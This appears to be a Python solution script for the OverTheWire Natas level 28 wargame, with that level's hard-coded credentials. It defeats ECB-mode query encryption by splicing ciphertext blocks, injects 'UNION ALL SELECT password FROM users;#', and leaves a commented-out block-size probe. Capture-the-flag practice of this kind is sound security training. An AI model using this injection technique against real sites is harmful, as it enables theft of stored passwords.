#!/usr/bin/python 

import requests, base64, sys, string, urllib

# Found out query is encrypted probably with something like rc2 and has a static first few bytes
# Finished it with help from https://axcheron.github.io/writeups/otw/natas/#natas-28-solution

url = "http://natas28.natas.labs.overthewire.org/?"
auth = ("natas28", "JWwR438wkgTsNKBbcJoowyysdM82YjeF")

params = {
    "query": " " * 10
}
r = requests.get(url, params=params, auth=auth)
baseline = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)['query'][0] 
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

sql = 9 * " " + "' UNION ALL SELECT password FROM users;#"
params["query"] = sql
r = requests.get(url, params=params, auth=auth)
exploit = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)['query'][0] 
exploit = base64.b64decode(exploit.encode('utf-8'))

blocks = len(sql) - 10
while blocks % 16 != 0:
    blocks += 1
blocks = int(blocks/ 16)
print(blocks)

final = header + exploit[48:(48 + 16 * blocks)] + footer
final = base64.b64encode(final)
params["query"] = final
search_url = "http://natas28.natas.labs.overthewire.org/search.php?"
r = requests.get(search_url, params=params, auth=auth)
print(r.text)


# chars = string.ascii_letters + string.digits

# block_size = 22

# static = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"

# for char in chars:
#     params = {
#         "query": char + "a" * (block_size - 2) + char + char + "a" * (block_size - 2) + char
#     }

#     r = requests.get(url, auth=auth, params=params)

#     query = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)['query'][0] 
#     print(query)
    